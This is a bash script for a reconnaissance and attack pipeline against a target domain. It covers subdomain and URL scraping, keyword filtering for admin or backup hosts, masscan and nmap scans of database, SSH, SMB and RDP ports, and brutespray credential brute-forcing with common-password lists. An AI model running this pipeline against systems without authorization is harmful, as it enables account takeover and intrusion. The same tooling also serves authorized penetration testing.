#! /bin/bash
BOLD='\033[1m'
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
NC='\033[0m'

domain=""
directory=""
interesting_keywords=(
    "admin" "test" "testing" "dev" "staging" "beta" "portal" "secure"
    "api" "backend" "internal" "auth" "login" "signup" "register" 
    "dashboard" "manage" "management" "upload" "files" "content"
    "system" "debug" "monitoring" "server" "webmail" "mail" "smtp"
    "ftp" "sftp" "git" "repo" "docs" "documentation" "config" "settings"
    "root" "superuser" "data" "backup" "restore" "sandbox" "vulnerable"
    "legacy" "old" "archive" "private" "adminpanel" "control" "payment"
    "billing" "invoice" "crm" "erp" "sso" "oauth" "support" "helpdesk"
    "analytics" "reporting" "report" "status" "health" "check"
)


while getopts ":d:ljsbP" opt; do 
    case $opt in
        d)
            domain=$OPTARG
            directory="${domain}_recon"
            output_path="${HOME}/reconFramework/${domain}_recon/"
            ;;
        l)
            linked_discovery_flag=true
            ;;
        s)
            scraping_flag=true
            ;;
        b)
            brute_forcing_flag=true
            ;;
        P)
            port_scanning_flag=true
            ;;
        ?)
            echo "invalid option: -$OPTARG" >&2
            exit 1
            ;;
        :)
            echo "Option -$OPTARG requires an argument." >&2
            exit 1
            ;;
        esac
    done

if [ -z "$domain" ]; then
    echo "you must specify a domain with the -d option"
    exit 1 
fi

mkdir -p "$output_path"

source "$(dirname "$0")/scan.sh"


#function calls
if [ "$linked_discovery_flag" = true ]; then
    linked_discovery "$domain" "$directory" "$output_path"
fi

if [ "$scraping_flag" = true ]; then
    scraping "$domain" "$directory" "$output_path"
    # Extract interesting URLs from site URLs
    echo -e "${BOLD}${BLUE}[*] Extracting interesting subdomains from site URLs...${NC}"
    while IFS= read -r url; do
        for keyword in "${interesting_keywords[@]}"; do
            # Check if the URL contains an interesting keyword
            if [[ "$url" == *"$keyword"* ]]; then
                # Append the URL to the output file
                echo "$url" >> "${output_path}interesting.txt"
                break
            fi
        done
    done < "${output_path}actualSites.txt"

    # Extract interesting subdomains from unique subdomains
    echo -e "${BOLD}${BLUE}[*] Extracting interesting subdomains from unique subdomains...${NC}"
    while IFS= read -r subdomain; do
        for keyword in "${interesting_keywords[@]}"; do
            # Check if the subdomain contains an interesting keyword
            if [[ "$subdomain" == *"$keyword"* ]]; then
                # Append the subdomain to the output file
                echo "$subdomain" >> "${output_path}interestingSubs.txt"
                break
            fi
        done
    done < "${output_path}uniqueSubdomains.txt"

    echo -e "${BOLD}${BLUE}[*] Extraction complete.${NC}"
fi

if [ "$brute_forcing_flag" = true ]; then
    brute_forcing "$domain" "$directory" "$output_path"
fi


if [ "$port_scanning_flag" = true ]; then
    file_path="${output_path}uniqueSubdomains.txt"
    output_file="${output_path}dns_results.txt"

    # Check if input file exists
    if [ ! -f "$file_path" ]; then
        echo -e "${BOLD}${RED}[!] Subdomain file not found: $file_path ${NC}"
        exit 1
    fi

    echo -e "${BOLD}${RED}[*] Finding subdomains' IP addresses...${NC}"

    # Use a temporary file to store intermediate results
    temp_file=$(mktemp)

    while read -r domain; do
        # Error handling in case 'dig' fails
        ip=$(dig +short A "$domain" | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}')
        if [ ! -z "$ip" ]; then
            echo "$ip" >> "$temp_file"
        fi
    done < "$file_path"

    # Sort and remove duplicates before saving the results
    sort -u "$temp_file" > "$output_file"
    rm "$temp_file"  # Clean up the temporary file

    echo -e "${BOLD}${BLUE}[*] IP addresses saved to ${output_file}...${NC}"
    masscan_output="${output_path}masscan_results.txt"
    nmap_output="${output_path}nmap_results"
    brutespray_output="${output_path}brutespray_results.txt"

    ####### Masscan
    echo -e "${BOLD}${YELLOW}[*]Running masscan to find open ports...${NC}"
    sudo masscan -p22,3306,21,1433,5432,445,27017,1521,3389 --banners --source-ip 192.168.1.200 -iL "${output_file}" -oL "$masscan_output"
    
    # Check if masscan ran successfully
    if [ $? -ne 0 ]; then
        echo -e "${BOLD}${RED}[!] Masscan failed. Exiting...${NC}"
        exit 1
    fi

    echo -e "${BOLD}${BLUE}[*]Masscan results saved to ${masscan_output} ${NC}"
    
    # Extract cleaned IP addresses
    cat "$masscan_output" | grep -oP '(\d{1,3}\.){3}\d{1,3}' | sort -u > "${output_path}cleaned_masscan_results.txt"

    
    # Check if the cleaned file has results
    if [ ! -s "${output_path}cleaned_masscan_results.txt" ]; then
        echo -e "${BOLD}${RED}[!] No valid IPs found in masscan results. Exiting...${NC}"
        exit 1
    fi

    ###### Nmap
    echo -e "${BOLD}${RED}[*]Running nmap for detailed scanning...${NC}"
    sudo nmap -Pn -sV -iL "${output_path}cleaned_masscan_results.txt" -p22,3306,21,1433,5432,445,27017,1521,3389 -oG "$nmap_output.gnmap"

    # Check if nmap ran successfully
    if [ $? -ne 0 ]; then
        echo -e "${BOLD}${RED}[!] Nmap failed. Exiting...${NC}"
        exit 1
    fi

    echo -e "${BOLD}${GREEN}[*]Nmap results saved to ${nmap_output} ${NC}"

    ##### Brutespray
    echo -e "${BOLD}${YELLOW}[*]Running brutespray to brute-force services...${NC}"
    brutespray -f "${output_path}nmap_results.gnmap" -u /home/kali/SecLists/Usernames/top-usernames-shortlist.txt -p /home/kali/SecLists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt -t 5 -o "$brutespray_output"
    brutespray -f "${output_path}nmap_results.gnmap" -u /home/kali/SecLists/Usernames/top-usernames-shortlist.txt -p /home/kali/SecLists/Passwords/Common-Credentials/worst-passwords-2017-top100-slashdata.txt -t 5 -o "${brutespray_output}_2"
    brutespray -f "${output_path}nmap_results.gnmap" -u /home/kali/SecLists/Usernames/top-usernames-shortlist.txt -p /home/kali/SecLists/Passwords/Common-Credentials/best110.txt -t 5 -o "${brutespray_output}_3"

    # Check if brutespray ran successfully
    if [ $? -ne 0 ]; then
        echo -e "${BOLD}${RED}[!] Brutespray failed. Exiting...${NC}"
        exit 1
    fi

    echo -e "${BOLD}${RED}[*]Brutespray results saved to ${brutespray_output} ${NC}"
fi

